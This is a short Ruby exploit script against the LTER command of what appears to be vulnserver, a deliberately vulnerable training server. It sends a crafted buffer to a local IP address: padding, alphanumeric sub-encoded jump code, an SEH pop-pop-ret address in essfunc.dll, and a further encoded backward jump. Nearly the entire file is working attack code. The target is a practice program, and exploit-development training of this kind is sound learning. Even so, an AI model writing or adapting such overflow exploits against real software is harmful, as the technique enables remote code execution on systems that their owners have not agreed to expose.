#!/usr/bin/ruby
require 'socket'

target = '192.168.100.118'
port = 9999

s = TCPSocket.open(target, port)

# nseh offset at 3495
payload = "A" * 3400

# sub encode from jmp-ecx.bin
payload += "\x54\x58\x66\x2d\x28\x04\x50\x59\x54\x58\x2c\x20\x50\x5c\x25\x4a\x4d\x4e\x55\x25\x35\x32\x31\x2a\x05\x77\x61\x41\x41\x05\x66\x52\x41\x41\x05\x55\x61\x41\x41\x2d\x33\x33\x33\x33\x50"
payload += "\x40" * (3495 - payload.length)

# we move esp to eax, we jmp forward
payload += "\x54\x58\x71\x04"
# pop pop ret in essfunc.dll at 0x6250172b
payload += "\x2b\x17\x50\x62"

# sub encode from jmp-126.bin
payload += "\x66\x05\x11\x11\x2c\x62\x50\x5c\x66\x2d\x14\x7f\x50"
payload += "A" * (5000 - payload.length)

s.puts('LTER /.:/' + payload)
s.close()

